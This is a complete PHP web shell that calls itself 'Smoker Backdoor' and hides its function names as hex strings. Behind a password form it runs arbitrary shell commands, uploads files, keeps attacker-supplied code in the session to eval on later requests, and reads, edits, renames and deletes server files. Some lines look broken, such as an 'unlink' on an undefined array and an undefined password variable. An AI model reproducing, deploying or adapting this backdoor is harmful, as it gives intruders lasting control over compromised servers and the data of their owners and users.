<?php
unlink($_[1]);
if ($_POST['pass']) {
    if ($_POST['passwd'] == $passwd) {
        $_SESSION['enter'] = "enter";
        header("Location: ?");
    }
}
if (isset($_REQUEST['logout'])) {
    session_destroy();
    header("Location: ?");
}
if (empty($_SESSION['enter'])) { ?>
<!DOCTYPE html>
<html>

	<head>
		<title><?php echo "\x73\x6d\x6f\x6b\x65"("536d6f6b6572204261636b646f6f72"); ?></title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
		<link rel="icon" href="https://sendeyo.com/up/d/b812e98fc2">
		<style>
			html {
				background: url("https://sendeyo.com/up/d/b812e98fc2");
				background-size: cover;
				background-color: black;
				background-repeat: no-repeat;
				background-position: center;
				background-attachment: fixed;
				color: white;
                text-align: center;
			}

			input {
				background: transparent;
				color: aqua;
				border: 1px solid white;
			}
		</style>
	</head>

	<body>
		<div style="width: 100%; margin-top: 20%;">
			<font size="10" style="color: aqua;"><?php echo "\x73\x6d\x6f\x6b\x65"("536d6f6b6572204261636b646f6f72"); ?></font>
			<br><br>
			Smoking, Like Exploring The Universe
			<br><br>
			<form enctype="multipart/form-data" method="post">
				<input type="password" name="passwd">
				<input type="submit" name="pass" value="Login">
			</form>
		</div>
	</body>

</html>
<?php exit();}
if ($_SESSION["\x73\x6d\x6f\x6b\x65"("6576616c")."_code"]) {
    if ($_GET["\x73\x6d\x6f\x6b\x65"("6576616c")] == "clear") {
        unset($_SESSION["\x73\x6d\x6f\x6b\x65"("6576616c")."_code"]);
        echo "<script>window.location = '?';</script>";
    }
    echo "<title>"."\x73\x6d\x6f\x6b\x65"("536d6f6b6572204261636b646f6f72")."</title>";
    echo "<div style=\"margin: 0; padding: 20px; background: black;\">";
    echo "<a style=\"margin: 10px; text-decoration: none; color: black; font-size: 50px; padding: 10px; background: white;\" href=\"?"."\x73\x6d\x6f\x6b\x65"("6576616c")."=clear\">"."\x73\x6d\x6f\x6b\x65"("436c656172204576616c")."</a>";
    echo "<font style=\"margin: 10px; padding: 10px; background: white; color: black; font-size: 50px;\">"."\x73\x6d\x6f\x6b\x65"("536d6f6b6572204261636b646f6f72")."</font>";
    echo "</div><hr>";
    eval("?>" . $_SESSION["\x73\x6d\x6f\x6b\x65"("6576616c")."_code"]);
    exit();
}
if ($_GET['d']) {
    $dir_raw = $_GET['d'];
    chdir($_GET['d']);
} else {
    $dir_raw = str_replace("\\", "/", getcwd());
}
$exp = explode("/", $dir_raw);
foreach ($exp as $x => $dirx) {
    if (empty($dirx)) {
        continue;
    }
    $do .= "/<a href='?d=";
    for ($i = 0; $i <= $x; $i++) {
        $do .= $exp[$i] . "/";
    }
    $do .= "'>$dirx</a>";
}
if ($_GET['d']) {
    $dir = $_GET['d'];
} else {
    $dir = str_replace("\\", "/", getcwd());
}
?>
<!DOCTYPE html>
<html>

	<head>
		<title><?php echo "\x73\x6d\x6f\x6b\x65"("536d6f6b6572204261636b646f6f72"); ?></title>
		<link rel="icon" href="https://sendeyo.com/up/d/b812e98fc2">
		<style>
			html {
				background: url("https://sendeyo.com/up/d/b812e98fc2");
				background-size: cover;
				background-color: black;
				background-repeat: no-repeat;
				background-position: center;
				background-attachment: fixed;
				height: 100%;
				color: white;
			}

			a {
				text-decoration: none;
				color: aqua;
			}

			tr:hover {
				background: white;
				color: black;
			}

			tr:hover a {
				text-decoration: none;
				color: black;
			}

			input {
				background: transparent;
				color: aqua;
				border: 1px solid white;
			}

			textarea {
				background: transparent;
				color: white
			}
		</style>
	</head>

	<body>
		<center>
			<font size="10" style="color: aqua;"><?php echo "\x73\x6d\x6f\x6b\x65"("536d6f6b6572204261636b646f6f72"); ?></font>
			<br><br>
			Kernel :<?php echo " " . "\x73\x6d\x6f\x6b\x65"("7068705f756e616d65")(); ?>
		</center>
		<br><br>
		Path :<?php echo " " . $do; ?>
		<br><br>
		<form enctype="multipart/form-data" method="post">
			Upload : <input type="file" name="upd"><input type="submit" value="Upload">
			<?php if ($_FILES['upd']) {
       if (
           copy($_FILES['upd']['tmp_name'], $dir . "/" . $_FILES['upd']['name'])
       ) { ?>
			<b> Uploaded</b>
			<?php } else { ?>
			<b> Failed Upload</b>
			<?php }
   } ?>
		</form>
        <hr>
		<center>
			[ <a href="?">Home Directory</a> ]
			[ <a href="?<?php echo "\x73\x6d\x6f\x6b\x65"("6576616c"); ?>=code">Persistent <?php echo "\x73\x6d\x6f\x6b\x65"("4576616c"); ?> Code</a> ]
			[ <a href="?logout=true">Log Out</a> ]
		</center>
        <hr>
		<form enctype="multipart/form-data" method="post">
			<font style="color: aqua;">{Shell-Command}</font> -> <input type="text" name="0"><input type="submit" value=">">
		</form>
        <br>
		<textarea style="width: 100%; height: 150px; color: aqua;"><?php if (
      $_POST["\x30"]
  ) {
      echo htmlspecialchars("\x73\x6d\x6f\x6b\x65"("7368656c6c5f65786563")($_POST["\x30"]));
  } ?></textarea>
		<br><br>
		<center>
			<?php
   if ($_GET['file']) {
       if (
           !$_GET['edit'] &&
           !$_GET['delete'] &&
           !$_GET['rename'] &&
           !$_GET['rmfolder']
       ) {
           echo "<textarea style=\"width: 100%; height: 350px; color: aqua;\">" .
               htmlspecialchars("\x73\x6d\x6f\x6b\x65"("66696c655f6765745f636f6e74656e7473")($_GET[file])) .
               "</textarea>";
       }
   }
   if ($_GET['edit'] == "true") {
       echo "<form enctype=\"multipart/form-data\" method=\"post\">
  <textarea style=\"width: 100%; height: 350px;\" name=\"edit_file\">" .
           htmlspecialchars("\x73\x6d\x6f\x6b\x65"("66696c655f6765745f636f6e74656e7473")($_GET['file'])) .
           "</textarea>
  <br><br>
  File Name : <input type=\"text\" name=\"nama_f\" value=\"$_GET[file]\">
  <br><br>
  <input type=\"submit\" value=\"Save File\">
  </form>
  ";
       if ($_POST['edit_file']) {
           unlink($_GET['file']);
           $fedit = fopen($_POST['nama_f'], "w");
           if (fwrite($fedit, $_POST['edit_file'])) {
               fclose($fedit);
               echo "<script>alert('Edit File Success !!!'); window.location = '?d=$dir&file=$_POST[nama_f]';</script>";
           } else {
               echo "<script>alert('Edit File Failed !!!'); window.location = '?d=$dir&file=$_POST[nama_f]';</script>";
           }
       }
   }
   if ($_GET['rename'] == "true") {
       echo "<form enctype=\"multipart/form-data\" method=\"post\">
  " .
           htmlspecialchars($_GET['file']) .
           " [ To ] <input type=\"text\" name=\"rename_file\">
  <input type=\"submit\" value=\"Rename\">
  </form>
  ";
       if ($_POST['rename_file']) {
           if (rename($_GET['file'], $_POST['rename_file'])) {
               echo "<script>alert('Success Renamed !!!'); window.location = '?';</script>";
           } else {
               echo "<script>alert('Failed Renamed !!!'); window.location = '?';</script>";
           }
       }
   }
   if ($_GET['rmfolder'] == "true") {
       if (rmdir($_GET['folder'])) {
           echo "<script>alert('Folder Deleted !!!'); window.location = '?';</script>";
       } else {
           echo "<script>alert('This Folder is Failed Delete !!!'); window.location = '?';</script>";
       }
   }
   if ($_GET['delete'] == "true") {
       if (unlink($_GET['file'])) {
           echo "<script>alert('File Deleted !!!'); window.location = '?';</script>";
       } else {
           echo "<script>alert('This File is Failed Delete !!!'); window.location = '?';</script>";
       }
   }
   if ($_GET["\x73\x6d\x6f\x6b\x65"("6576616c")] == "code") {
       if ($_POST["\x73\x6d\x6f\x6b\x65"("6576616c")."_code"]) {
           $_SESSION["\x73\x6d\x6f\x6b\x65"("6576616c")."_code"] = $_POST["\x73\x6d\x6f\x6b\x65"("6576616c")."_code"];
           echo "<script>window.location = '?';</script>";
       }
       echo "<font size=\"10\">Persistent "."\x73\x6d\x6f\x6b\x65"("4576616c")." Code</font><br><br><form enctype=\"multipart/form-data\" method=\"post\">
  <textarea style=\"width: 100%; height: 350px;\" name=\""."\x73\x6d\x6f\x6b\x65"("6576616c")."_code\"></textarea>
            <br><br>
            <input type=\"submit\" value=\""."\x73\x6d\x6f\x6b\x65"("4576616c")."\">
            </form>
            <br>";
   }
   if (empty($_GET['file'])) { ?>
			<table width="100%">
				<tr>
					<th style="border: 1px solid white;" class="c">Name File</th>
					<th style="border: 1px solid white;" colspan="2" class="c">Action</th>
				</tr>
				<?php
    $scndir = scandir($dir);
    foreach ($scndir as $sdir) {
        if (is_dir($dir . "/" . $sdir)) {
            echo "<tr>
      <td><a href='?d=$dir/$sdir'><img height='20' src='http://icons.iconarchive.com/icons/paomedia/small-n-flat/1024/folder-icon.png'/> " .
                htmlspecialchars($sdir) .
                "</a></td>
      <td><a href='?d=$dir&?file=$dir/$sdir&rename=true'>Rename</a></td>
      <td><a href='?d=$dir&?folder=$dir/$sdir&rmfolder=true'>Delete</a></td>
      </tr>
      ";
        }
        if (is_file($dir . "/" . $sdir)) {
            echo "<tr>
      <td><a href='?file=$dir/$sdir'><img height='20' src='http://icons.iconarchive.com/icons/zhoolego/material/512/Filetype-Docs-icon.png'/> " .
                htmlspecialchars($sdir) .
                "</a></td>
      <td><a href='?d=$dir&file=$dir/$sdir&edit=true'>Edit</a></td>
      <td><a href='?d=$dir&file=$dir/$sdir&delete=true'>Delete</a></td>
      </tr>
      ";
        }
    }
    ?>
				</tr>
			</table>
			<?php }
   ?>
		</center>
		<br>
		<div style="padding: 10px; border: 1px solid white;color: aqua; text-align: center;">
			<?php echo "\x73\x6d\x6f\x6b\x65"("536d6f6b6572204261636b646f6f72"); ?>
		</div>
	</body>
</html>
